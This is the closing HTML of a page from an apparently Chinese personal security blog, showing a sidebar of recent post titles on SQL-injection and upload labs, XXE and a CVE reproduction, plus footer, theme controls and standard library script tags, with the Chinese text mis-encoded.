datetime="2025-12-28T13:00:00.000Z" title="å‘è¡¨äº 2025-12-28 21:00:00">2025-12-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/24/sql%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/" title="sqlé¶åœºé‡åš">sqlé¶åœºé‡åš</a><time datetime="2025-12-23T16:00:00.000Z" title="å‘è¡¨äº 2025-12-24 00:00:00">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/07/upload%E9%9D%B6%E5%9C%BA%E9%87%8D%E5%81%9A/" title="uploadé¶åœºé‡åš">uploadé¶åœºé‡åš</a><time datetime="2025-01-07T10:00:00.000Z" title="å‘è¡¨äº 2025-01-07 18:00:00">2025-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/06/XXE/" title="XXE">XXE</a><time datetime="2025-01-06T14:00:00.000Z" title="å‘è¡¨äº 2025-01-06 22:00:00">2025-01-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/05/%E5%A4%8D%E7%8E%B0CVE-2025-68664/" title="å¤ç°CVE-2025-68664">å¤ç°CVE-2025-68664</a><time datetime="2025-01-05T13:00:00.000Z" title="å‘è¡¨äº 2025-01-05 21:00:00">2025-01-05</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xiexie</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="ç®€ç¹è½¬æ¢">ç¹</button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><script src="/js/tw_cn.js?v=5.5.3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>